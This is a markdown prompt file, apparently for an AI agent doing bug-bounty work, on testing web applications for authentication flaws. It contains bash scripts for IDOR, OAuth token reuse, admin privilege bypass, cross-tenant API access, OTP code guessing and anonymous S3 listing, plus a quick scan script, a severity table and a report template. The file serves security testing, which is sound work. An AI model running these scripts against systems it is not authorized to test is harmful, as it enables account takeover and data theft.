---
description: Find AUTH vulnerabilities in web applications. Use when testing for AUTH issues.
---

# AUTH Vulnerability Testing Agent

## High-Value Patterns from Real Reports

### Common Parameters
- `comment_id` - IDOR on comment access
- `organization_id` - Cross-organization access
- `user_id` - User impersonation
- `oauth_token` - Token reuse/hijacking
- `redirect_uri` - Path traversal attacks
- `verification_code` - OTP reuse
- `reset_token` - Password reset bypasses

### Vulnerable Endpoints
- `/admin/users.json` - Staff creation without authorization
- `/api/v*/organizations/{id}/*` - Cross-org access
- `/preview_bar` - Password protection bypass
- `/sender_emails` - Email configuration bypass
- `/admin/payment_gateways.json` - Settings disclosure
- `/oauth/authenticate` - Token hijacking
- `/**/callback/../../../*` - Path traversal in redirects

### Critical Headers
- `X-Requested-With: XMLHttpRequest`
- `X-CSRF-Token` - CSRF bypass attempts
- `Authorization: Bearer` - Token reuse testing
- `X-User-id` - User context manipulation

## Discovery Commands

```bash
# Find authentication endpoints
curl -s "$TARGET" | grep -oE '(login|auth|oauth|reset|verify|2fa|otp)' | sort -u

# Enumerate admin/API paths
for path in admin api/v1 api/v2 api/v3 oauth preview_bar; do
  curl -s -o /dev/null -w "%{http_code}: $TARGET/$path\n" "$TARGET/$path"
done

# Check for exposed S3 buckets
aws s3 ls s3://$(echo $TARGET | sed 's/https\?:\/\///')-attachments --no-sign-request 2>/dev/null

# Find password reset patterns
curl -s "$TARGET/reset" -X POST -d "email=test@test.com" | grep -i "token\|link\|code"

# Discover OAuth endpoints
curl -s "$TARGET" | grep -oE 'oauth[^"]*' | head -10
```

## Step-by-Step Testing Methodology

### 1. Password Reset Token Persistence
```bash
# Test if reset tokens persist after email change
echo "Testing password reset token persistence..."

# Request reset token
RESET_RESP=$(curl -s -X POST "$TARGET/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}')

echo $RESET_RESP | grep -q "sent\|success" && echo "[+] Reset initiated"

# Manual step: Change email in account settings, then test if old reset link still works
echo "[!] Manual: Change email in account, then test reset link"
```

### 2. IDOR Testing on Comments/Resources
```bash
# Test comment access across users
test_idor_comments() {
  TARGET_URL="$1"
  COMMENT_ID="$2"
  
  # Try accessing comment edit form without authorization
  curl -s -X GET "$TARGET_URL?comment_id=$COMMENT_ID&action=comment_edit_form" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Accept: text/html, application/xml, text/xml, */*" | \
    grep -q "comment" && echo "[+] IDOR: Comment $COMMENT_ID accessible"
}

# Usage: test_idor_comments "https://target.com/video/123" "1301116"
```

### 3. OAuth Token Hijacking
```bash
# Test OAuth token reuse
test_oauth_hijack() {
  OAUTH_URL="$1"
  
  # Extract oauth_token parameter
  TOKEN=$(echo "$OAUTH_URL" | grep -oE 'oauth_token=[^&]*' | cut -d= -f2)
  
  if [ ! -z "$TOKEN" ]; then
    echo "[+] Found OAuth token: $TOKEN"
    echo "[!] Test in different browser/session: https://api.twitter.com/oauth/authenticate?oauth_token=$TOKEN"
  fi
}

# Usage: test_oauth_hijack "https://api.twitter.com/oauth/authenticate?oauth_token=xpXP21WOz..."
```

### 4. Admin API Access Without Proper Permissions
```bash
# Test admin endpoints with limited user tokens
test_admin_bypass() {
  SHOP_URL="$1"
  AUTH_TOKEN="$2"
  
  # Test user creation (should require owner access)
  curl -s -X POST "$SHOP_URL/admin/users.json" \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"user":{"email":"test@test.com","first_name":"Test","last_name":"User","pin":1234}}' | \
    grep -q '"id"' && echo "[+] CRITICAL: User created without owner access"
  
  # Test payment gateway access
  curl -s -X GET "$SHOP_URL/admin/payment_gateways.json" \
    -H "Authorization: Bearer $AUTH_TOKEN" | \
    grep -q "gateway" && echo "[+] Payment gateways exposed without settings permission"
}
```

### 5. Preview/Password Protection Bypass
```bash
# Test Shopify preview bypass
test_preview_bypass() {
  SHOP_URL="$1"
  
  # Get preview URL from preview_bar
  PREVIEW_URL=$(curl -s "$SHOP_URL/preview_bar" | \
    grep -oE 'https://[^"]*shopifypreview[^"]*' | head -1)
  
  if [ ! -z "$PREVIEW_URL" ]; then
    echo "[+] Found preview URL: $PREVIEW_URL"
    curl -s "$PREVIEW_URL" | grep -q "password" && \
      echo "[-] Preview still requires password" || \
      echo "[+] CRITICAL: Password protection bypassed via preview"
  fi
}
```

### 6. Organization/Cross-Tenant Access
```bash
# Test cross-organization access
test_cross_org() {
  BASE_URL="$1"
  ORG_ID_A="$2" 
  ORG_ID_B="$3"
  TOKEN="$4"
  
  # Try accessing org B with org A credentials
  curl -s -X POST "$BASE_URL/api/v3/organizations/$ORG_ID_B/mopub/activate" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "company_name=test&address1=test&city=test&state=test&zip_code=12345&country_code=US" | \
    grep -q '"api_key"' && echo "[+] CRITICAL: Cross-organization access"
}
```

### 7. OTP/2FA Bypass Testing
```bash
# Test OTP reuse and rate limiting
test_otp_bypass() {
  TARGET="$1"
  USER_ID="$2"
  
  # Test if old verification codes still work
  for code in 1234 0000 1111 1234; do
    RESP=$(curl -s -X POST "$TARGET/verify" \
      -H "Content-Type: application/json" \
      -d "{\"user_id\":\"$USER_ID\",\"code\":\"$code\"}")
    
    echo "$RESP" | grep -q "success\|complete" && \
      echo "[+] OTP bypass with code: $code"
  done
}
```

## Severity Rating Table

| Finding | Severity | CVSS | Criteria |
|---------|----------|------|----------|
| Password reset token persistence after email change | High | 8.1 | Account takeover possible |
| Cross-organization API access | Critical | 9.1 | Multi-tenant data breach |
| OAuth token reuse/hijacking | High | 7.4 | Authentication bypass |
| Admin function access without proper roles | High | 8.8 | Privilege escalation |
| Preview bypassing password protection | Medium | 6.5 | Information disclosure |
| OTP/2FA code reuse | High | 7.7 | Authentication factor bypass |
| IDOR on private resources | Medium | 6.5 | Unauthorized data access |
| S3 bucket write access | High | 8.2 | Data integrity compromise |

## False Positives to Ignore

- **Rate limiting on client side only**: Only flag if server-side bypass confirmed
- **Expired tokens returning generic errors**: Must show actual access granted  
- **Public preview URLs by design**: Verify if password protection is claimed feature
- **Different user accessing public resources**: Must be private/restricted content
- **OAuth errors during normal flow**: Must demonstrate actual account compromise
- **Admin seeing own organization data**: Must be cross-tenant access

## Finding Report Template

```markdown
## AUTH-[ID]: [Vulnerability Type]

**Severity**: [Critical/High/Medium/Low]
**CVSS Score**: [X.X]

### Summary
[Brief description of the authentication vulnerability]

### Technical Details
**Vulnerable Endpoint**: `[URL/endpoint]`
**Method**: `[GET/POST/etc]`
**Key Parameters**: `[param1, param2]`

### Proof of Concept
```bash
# Step 1: [Description]
curl -s -X POST "https://target.com/endpoint" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"param":"value"}'

# Step 2: [Description]  
[Additional commands]
```

### Impact
- [ ] Account takeover
- [ ] Privilege escalation  
- [ ] Information disclosure
- [ ] Cross-tenant access
- [ ] Authentication bypass

**Business Impact**: [Describe real-world impact]

### Remediation
1. [Specific fix recommendation]
2. [Additional security measures]

### References
- Similar HackerOne Report: [Report ID if applicable]
- OWASP Reference: [Relevant OWASP category]
```

## Quick Test Suite

```bash
#!/bin/bash
# AUTH vulnerability quick test
TARGET="$1"

echo "=== AUTH VULNERABILITY SCAN ==="
echo "Target: $TARGET"

# 1. Check for common auth endpoints
echo "[1] Discovering auth endpoints..."
for endpoint in login admin/users.json oauth/authenticate password/reset preview_bar; do
  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" "$TARGET/$endpoint"
done

# 2. Look for OAuth parameters in page source
echo "[2] Checking for OAuth tokens..."
curl -s "$TARGET" | grep -oE 'oauth_token=[^&"]*' | head -3

# 3. Test for admin API access
echo "[3] Testing admin access..."
curl -s -X GET "$TARGET/admin/payment_gateways.json" | head -100

# 4. Check for preview bypass
echo "[4] Testing preview bypass..."
curl -s "$TARGET/preview_bar" | grep -oE 'https://[^"]*preview[^"]*'

echo "=== Scan complete. Review results above ==="
```